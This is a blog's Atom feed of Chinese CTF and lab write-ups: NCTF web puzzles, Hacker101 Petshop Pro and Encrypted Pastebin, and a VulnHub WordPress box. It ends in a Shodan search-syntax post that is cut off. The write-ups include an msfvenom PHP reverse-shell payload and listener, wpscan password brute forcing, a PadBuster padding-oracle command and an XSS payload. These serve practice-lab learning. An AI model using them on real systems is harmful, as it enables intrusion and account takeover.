<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XTTF的小屋</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-02-18T00:41:40.682Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>XTTF</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Web安全练习（一）</title>
    <link href="http://yoursite.com/2020/02/08/Web%E5%AE%89%E5%85%A8%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2020/02/08/Web安全练习（一）/</id>
    <published>2020-02-08T04:13:36.000Z</published>
    <updated>2020-02-18T00:41:40.682Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>web安全实战为主，但是未授权网站违法，故做点CTF的题，本想从实验吧开始无奈还在维护，所以从南邮CTF入手</p><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200217180405.png" alt=""></p><p>直接出答案，最简单的题</p><h4 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h4><p>这道题，给了一段PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</div><div class="line">$a = @$_GET[<span class="string">'a'</span>];</div><div class="line">$md52 = @md5($a);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</div><div class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</div><div class="line">&#125;&#125;</div><div class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</div></pre></td></tr></table></figure><p>首先对<code>md51</code>的值进行md5加密，然后用户输入一个<code>md52</code>的值，但是用户输入的字符不能和<code>md51</code>一样同时md5值要相同。</p><p>这里一共有两个知识点，md5 <code>0e</code>开头和<code>==</code>在<code>php</code>中存在的问题</p><p>首先我们先解决第一个问题，对<code>QNKCDZO</code>进行<code>md5</code>加密得到<code>0e830400451993494058024219903391</code> </p><p>第二个问题关于<code>==</code>在<code>php</code>中存在的安全问题，PHP在处理哈希字符串时，会利用<code>!=</code>或<code>==</code>来对哈希值进行比较，它把每一个以<code>0E</code>开头的哈希值都解释为0</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200217181757.png" alt=""></p><p>所以这里找一个0e开头的字符串就ok了，比如<code>s878926199a</code>对应<code>0e545993274517709034328855841020</code></p><h4 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h4><p>这也是一道简单题，不会做就先右键看看源码</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200217182642.png" alt=""></p><p>这个口令绝对比10个字符要长，所以改下长度就好</p><h4 id="这题不是web"><a href="#这题不是web" class="headerlink" title="这题不是web"></a>这题不是web</h4><p>打开题发现一个动图，不是web就下载图片，<code>cat 2.gif</code> 即可看到flag</p><h4 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h4><p>打开先查看源码，发现一个<code>SO.html</code>打开，在看源码发现一个<code>S0.html</code>，再看源码，到最后找到一个<code>404.html</code></p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200217184038.png" alt=""></p><p>右键源码中拿到flag</p><h4 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h4><p>打开网站发现这个</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200217184311.png" alt=""></p><p>题目提示<code>aaencode</code>，google到一个网站<code>http://www.atoolbox.net/Tool.php?Id=703</code>解密到flag</p><h4 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h4><p>打开先看源码</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200217195453.png" alt=""></p><p>点击进去，发现跳转到<code>no_key_is_here_forever.php</code> ，这里应该使用了js进行跳转</p><p>这里我直接使用了burp进行抓包，发现使用了<code>window.location=</code> </p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200217195609.png" alt=""></p><p>拿到flag</p><h4 id="PHP-encode"><a href="#PHP-encode" class="headerlink" title="PHP encode"></a>PHP encode</h4><p>一道看源码的题，那么分析下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span><span class="params">($ZzvSWE)</span> </span>&#123;</div><div class="line"> </div><div class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</div><div class="line"> </div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</div><div class="line"> </div><div class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</div><div class="line"> </div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    <span class="keyword">return</span> $ZzvSWE;</div><div class="line"> </div><div class="line">&#125;</div><div class="line"><span class="keyword">eval</span>(CLsI(<span class="string">"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="</span>));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>直接找个php沙盒运行，需要把eval改成echo</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200217201115.png" alt=""></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>使用<code>php://filter</code>协议包含<code>index.php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></div></pre></td></tr></table></figure><p>得到base64加密文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</div></pre></td></tr></table></figure><p>解密即得到flag</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>从这里学到了一些东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1. 关于php://filter协议进行文件包含进行源码泄露</div><div class="line">2. 遇到网站多看看它的html文件，可能有好东西</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Hacker101 之Petshop Pro</title>
    <link href="http://yoursite.com/2020/01/02/Hacker101%20%E4%B9%8BPetshop%20Pro/"/>
    <id>http://yoursite.com/2020/01/02/Hacker101 之Petshop Pro/</id>
    <published>2020-01-02T10:30:00.000Z</published>
    <updated>2020-01-03T00:31:35.283Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>打开页面发现是个购物的功能</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200102112008.png" alt=""></p><p>首先用burp进行截包，看看有什么好玩的东西，点击加入购物车，抓第二个包，发现并没有什么东西，放包发现跳转到支付界面。</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200102112252.png" alt=""></p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200102112445.png" alt=""></p><p>那么抓下包，发现存在一个cart参数，使用url解码后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[[0, &#123;<span class="string">"logo"</span>: <span class="string">"kitten.jpg"</span>, <span class="string">"price"</span>: 8.95, <span class="string">"name"</span>: <span class="string">"Kitten"</span>, <span class="string">"desc"</span>: <span class="string">"8\"x10\" color glossy photograph of a kitten."</span>&#125;], [0, &#123;<span class="string">"logo"</span>: <span class="string">"kitten.jpg"</span>, <span class="string">"price"</span>: 8.95, <span class="string">"name"</span>: <span class="string">"Kitten"</span>, <span class="string">"desc"</span>: <span class="string">"8\"x10\" color glossy photograph of a kitten."</span>&#125;]]</div></pre></td></tr></table></figure><p>这里想到了0元支付漏洞，可以尝试一下，可以拿到第一个Flag</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200102112733.png" alt=""></p><p>看看有没有常见目录，发现有个login页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://34.74.105.127/2b3f9e5394/login</div></pre></td></tr></table></figure><p>没有验证码，应该可以爆破，跑到一个用户名<code>antonetta</code>，然后开始跑密码</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200102114506.png" alt=""></p><p>也跑出了密码<code>claudia</code></p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200102123103.png" alt=""></p><p>拿到了第二个Flag</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200102123243.png" alt=""></p><p>然后测试Edit中可写的三处，可以尝试xss</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200103082704.png" alt=""></p><p>这里我测试了Name字段，<code>&lt;img src=x onerror=alert(1)&gt;</code>  可弹窗</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200103082808.png" alt=""></p><p>点击</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200103082833.png" alt=""></p><p>拿到最后一个Flag</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200103082900.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Hacker101之Encrypted Pastebin题解</title>
    <link href="http://yoursite.com/2020/01/01/Hacker101%E4%B9%8BEncrypted%20Pastebin/"/>
    <id>http://yoursite.com/2020/01/01/Hacker101之Encrypted Pastebin/</id>
    <published>2020-01-01T04:13:36.000Z</published>
    <updated>2020-01-01T11:49:29.122Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>打开链接<a href="http://35.227.24.107/b3494b3299/" target="_blank" rel="external">http://35.227.24.107/b3494b3299/</a></p><p>发现是一行字，两个框外加一个按钮。</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200101013713.png" alt=""></p><p>这里测试输入test/test 通过burp抓包发现，发现存在一个<code>post</code>参数，这里可以测试下（修改下值）</p><h4 id="第一个Flag"><a href="#第一个Flag" class="headerlink" title="第一个Flag"></a>第一个Flag</h4><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200101014229.png" alt=""></p><p>这里我把post参数的值改成了1，得到第一个flag <code>0fbf9a7732fdac03005363563db2a3b0a08d0735a61cfc4c9369cc3eab69d27b</code></p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200101015206.png" alt=""></p><h4 id="第二个Flag"><a href="#第二个Flag" class="headerlink" title="第二个Flag"></a>第二个Flag</h4><p>接下来找第二个flag，现在唯一有用的貌似就是那个报错信息了,看这个应该是用了base64之类的，然后题目在最开始提示了AES加密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"./main.py"</span>, line 69, <span class="keyword">in</span> index</div><div class="line">    post = json.loads(decryptLink(postCt).decode(<span class="string">'utf8'</span>))</div><div class="line">  File <span class="string">"./common.py"</span>, line 46, <span class="keyword">in</span> decryptLink</div><div class="line">    data = b64d(data)</div><div class="line">  File <span class="string">"./common.py"</span>, line 11, <span class="keyword">in</span> &lt;lambda&gt;</div><div class="line">    b64d = lambda x: base64.decodestring(x.replace(<span class="string">'~'</span>, <span class="string">'='</span>).replace(<span class="string">'!'</span>, <span class="string">'/'</span>).replace(<span class="string">'-'</span>, <span class="string">'+'</span>))</div><div class="line">  File <span class="string">"/usr/local/lib/python2.7/base64.py"</span>, line 328, <span class="keyword">in</span> decodestring</div><div class="line">    <span class="built_in">return</span> binascii.a2b_base64(s)</div><div class="line">Error: Incorrect padding   //base64填充错误</div></pre></td></tr></table></figure><p>首先根据里面的替换规则把base64替换下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://35.227.24.107/7c4322d4f4/?post=UDbJkUKc6eXpmQfzSXPEyDqntXYEW/kR1FQc3qp59PYi7CBgZZHuVw2ITv44vlKS4YZyMtLB5rY+ynJYijjn6WSQ2+OYcXdUa6n6HZoevmcId2dFnuMgd1dOl6tFi6JlYc00KD87wqgvumyMFEhPy4j9LsnHF7Dly7O6fXaZ0WMlFWVM2NZE3koOoCPsz0JoUd5E3Bf9gByJ+bZQgt6oqA==</div></pre></td></tr></table></figure><p>这里卡住了，懵逼中，在几个小时一直在burp上测试，后来发现把post参数值留空发现了报错信息变了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"./main.py"</span>, line 69, <span class="keyword">in</span> index</div><div class="line">    post = json.loads(decryptLink(postCt).decode(<span class="string">'utf8'</span>))</div><div class="line">  File <span class="string">"./common.py"</span>, line 48, <span class="keyword">in</span> decryptLink</div><div class="line">    cipher = AES.new(staticKey, AES.MODE_CBC, iv)</div><div class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py"</span>, line 95, <span class="keyword">in</span> new</div><div class="line">    <span class="built_in">return</span> AESCipher(key, *args, **kwargs)</div><div class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py"</span>, line 59, <span class="keyword">in</span> __init__</div><div class="line">    blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)</div><div class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py"</span>, line 141, <span class="keyword">in</span> __init__</div><div class="line">    self._cipher = factory.new(key, *args, **kwargs)</div><div class="line">ValueError: IV must be 16 bytes long</div></pre></td></tr></table></figure><p>这里我搜了下AES.MODE_CBC，结合上面Incorrect padding 去google了一把找到了这个问题The CBC Padding Oracle Problem链接如下 <a href="https://eklitzke.org/the-cbc-padding-oracle-problem" target="_blank" rel="external">https://eklitzke.org/the-cbc-padding-oracle-problem</a> 因为我没搞过密码学的东西，所以只能去搜下有没有工具一类的，通过Google发现了kali下有一个叫<code>PadBuster</code>的工具。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./padBuster.pl &quot;http://35.227.24.107/7c4322d4f4/?post=UDbJkUKc6eXpmQfzSXPEyDqntXYEW/kR1FQc3qp59PYi7CBgZZHuVw2ITv44vlKS4YZyMtLB5rY+ynJYijjn6WSQ2+OYcXdUa6n6HZoevmcId2dFnuMgd1dOl6tFi6JlYc00KD87wqgvumyMFEhPy4j9LsnHF7Dly7O6fXaZ0WMlFWVM2NZE3koOoCPsz0JoUd5E3Bf9gByJ+bZQgt6oqA==&quot; UDbJkUKc6eXpmQfzSXPEyDqntXYEW/kR1FQc3qp59PYi7CBgZZHuVw2ITv44vlKS4YZyMtLB5rY+ynJYijjn6WSQ2+OYcXdUa6n6HZoevmcId2dFnuMgd1dOl6tFi6JlYc00KD87wqgvumyMFEhPy4j9LsnHF7Dly7O6fXaZ0WMlFWVM2NZE3koOoCPsz0JoUd5E3Bf9gByJ+bZQgt6oqA== 16 -encoding 0</div></pre></td></tr></table></figure><p>这样跑一下就出结果了，因为我网络的原因我跑不出来。跑了一下午也就跑出了这个（我太难了）</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20200101194326.png" alt=""></p><p>这样相当于解决了第二个flag</p><h4 id="第三个Flag"><a href="#第三个Flag" class="headerlink" title="第三个Flag"></a>第三个Flag</h4><p>先学下AES加密之类的，先溜了。。。。。。。</p><h4 id="第四个Flag"><a href="#第四个Flag" class="headerlink" title="第四个Flag"></a>第四个Flag</h4>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Literally Vulnerable实验</title>
    <link href="http://yoursite.com/2019/12/15/UA%20Literally%20Vulnerable%E5%AE%9E%E9%AA%8C/"/>
    <id>http://yoursite.com/2019/12/15/UA Literally Vulnerable实验/</id>
    <published>2019-12-15T04:13:36.000Z</published>
    <updated>2019-12-15T05:55:22.557Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>在vm中启动试验机</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215012023.png" alt=""></p><h3 id="探测IP地址"><a href="#探测IP地址" class="headerlink" title="探测IP地址"></a>探测IP地址</h3><p>首先执行本机<strong>ifconfig</strong>查看vm网卡地址</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215012233.png" alt=""></p><p>使用nmap探测存活主机</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215012323.png" alt=""></p><p>从中发现192.168.146.128为实验主机。</p><h3 id="探测端口信息"><a href="#探测端口信息" class="headerlink" title="探测端口信息"></a>探测端口信息</h3><p>使用nmap扫描实验主机端口开放信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">nmap -p- -A  192.168.146.128</div><div class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-15 01:25 CST</div><div class="line">Nmap scan report for literally.vulnerable (192.168.146.128)</div><div class="line">Host is up (0.00059s latency).</div><div class="line">Not shown: 65531 closed ports</div><div class="line">PORT      STATE SERVICE VERSION</div><div class="line">21/tcp    open  ftp     vsftpd 3.0.3</div><div class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</div><div class="line">|_-rw-r--r--    1 ftp      ftp           325 Dec 04 13:05 backupPasswords</div><div class="line">| ftp-syst: </div><div class="line">|   STAT: </div><div class="line">| FTP server status:</div><div class="line">|      Connected to ::ffff:192.168.146.129</div><div class="line">|      Logged in as ftp</div><div class="line">|      TYPE: ASCII</div><div class="line">|      No session bandwidth limit</div><div class="line">|      Session timeout in seconds is 300</div><div class="line">|      Control connection is plain text</div><div class="line">|      Data connections will be plain text</div><div class="line">|      At session startup, client count was 3</div><div class="line">|      vsFTPd 3.0.3 - secure, fast, stable</div><div class="line">|_End of status</div><div class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</div><div class="line">| ssh-hostkey: </div><div class="line">|   2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)</div><div class="line">|   256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA)</div><div class="line">|_  256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)</div><div class="line">80/tcp    open  http    nginx 1.14.0 (Ubuntu)</div><div class="line">|_http-generator: WordPress 5.3</div><div class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</div><div class="line">|_http-title: Not so Vulnerable &amp;#8211; Just another WordPress site</div><div class="line">|_http-trane-info: Problem with XML parsing of /evox/about</div><div class="line">65535/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</div><div class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</div><div class="line">|_http-title: Apache2 Ubuntu Default Page: It works</div><div class="line">MAC Address: 00:0C:29:01:26:7B (VMware)</div><div class="line">Device type: general purpose</div><div class="line">Running: Linux 3.X|4.X</div><div class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div><div class="line">OS details: Linux 3.2 - 4.9</div><div class="line">Network Distance: 1 hop</div><div class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</div><div class="line"></div><div class="line">TRACEROUTE</div><div class="line">HOP RTT     ADDRESS</div><div class="line">1   0.58 ms literally.vulnerable (192.168.146.128)</div><div class="line"></div><div class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div class="line">Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds</div></pre></td></tr></table></figure><p>从nmap的扫描信息得出 21端口存在anonymous访问</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215013145.png" alt=""></p><p>到此，21端口结束。</p><p>打开80端口，访问主页发现使用了WordPress </p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215013322.png" alt=""></p><p>这里没发现东西，接着尝试65535端口</p><p>经过跑目录发现了phpcms这个目录（这里我的字典没跑出来，看来还是太垃圾了）同样使用wpscan跑下用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">wpscan --url http://192.168.146.128:65535/phpcms/ --enumerate u</div><div class="line"></div><div class="line">......</div><div class="line"></div><div class="line">[+] notadmin</div><div class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div class="line"></div><div class="line">[+] maybeadmin</div><div class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</div></pre></td></tr></table></figure><p>发现存在两个用户名notadmin和maybeadmin，这里通过上面21端口中的密码本，对密码进行爆破得到maybeadmin的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">wpscan --url http://192.168.146.128:65535/phpcms/ -e u -P pass_wp.txt </div><div class="line"></div><div class="line"></div><div class="line">[+] maybeadmin</div><div class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div class="line"></div><div class="line">[+] notadmin</div><div class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div class="line"></div><div class="line">[+] Performing password attack on Xmlrpc against 2 user/s</div><div class="line">[SUCCESS] - maybeadmin / $EPid%J2L9LufO5                                                                                                                                                                                                                                             </div><div class="line">Trying notadmin / SCb$I^gDDqE34fA Time: 00:00:00 &lt;=================================================================================================================================================================================================&gt; (19 / 19) 100.00% Time: 00:00:00</div><div class="line"></div><div class="line">[i] Valid Combinations Found:</div><div class="line"> | Username: maybeadmin, Password: $EPid%J2L9LufO5</div></pre></td></tr></table></figure><h3 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h3><p>登录系统，发现一篇文章中有notadmin的密码 Pa$$w0rd13!&amp;，登入notadmin账号发现为wp管理员账号</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215122600.png" alt=""></p><p>上传shell，这里我使用了msf的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.146.131 LPORT=1234 -f raw &gt;shell.php</div></pre></td></tr></table></figure><p>通过wp的插件处上传shell</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215125410.png" alt=""></p><p>上传成功保存在/phpcms/wp-content/uploads/2019/12/shell.php</p><p>现在开始配置msf监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload php/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.146.131 </div><div class="line">set lport 1234</div></pre></td></tr></table></figure><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215125648.png" alt=""></p><p>拿到shell</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215130036.png" alt=""></p><p>后边提权的我再学学，太菜了。。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="vulnhub" scheme="http://yoursite.com/categories/vulnhub/"/>
    
    
      <category term="实验" scheme="http://yoursite.com/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>我用shodan的那些日子</title>
    <link href="http://yoursite.com/2019/11/08/%E6%88%91%E7%94%A8shodan%E7%9A%84%E9%82%A3%E4%BA%9B%E6%97%A5%E5%AD%90/"/>
    <id>http://yoursite.com/2019/11/08/我用shodan的那些日子/</id>
    <published>2019-11-08T04:13:36.000Z</published>
    <updated>2019-11-09T06:15:27.944Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>​    想当年第一次见到shodan还是一群大佬讨论摄像头的时候，当我打开大佬们的连接后，给我打开了新世界的大门，原来还有这等神器进行信息搜集。</p><p>​    在注册账号使用了一段时间后，我发现还是有个会员好使点，后来靠着臭不要脸的精神白嫖到一个账号（nice，爽），然后shodan便成为我挖漏洞前必备的神器。</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191109135542.png" alt=""></p><p>看，它长这样，它也有许多搜索语法就像google一样，这里列举我常用的几个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">http.title:&quot;关键字&quot;  // 用来查找标题包含关键字的</div><div class="line">http.html:&quot;关键字&quot;   // 用来查找html中包含关键字的</div><div class="line">country:&quot;CN&quot;   // 用来查找中国站点</div><div class="line"></div><div class="line">当使用组合查询时要这样使用</div><div class="line">http.title:&quot;关键字&quot; http.title:&quot;关键字&quot; 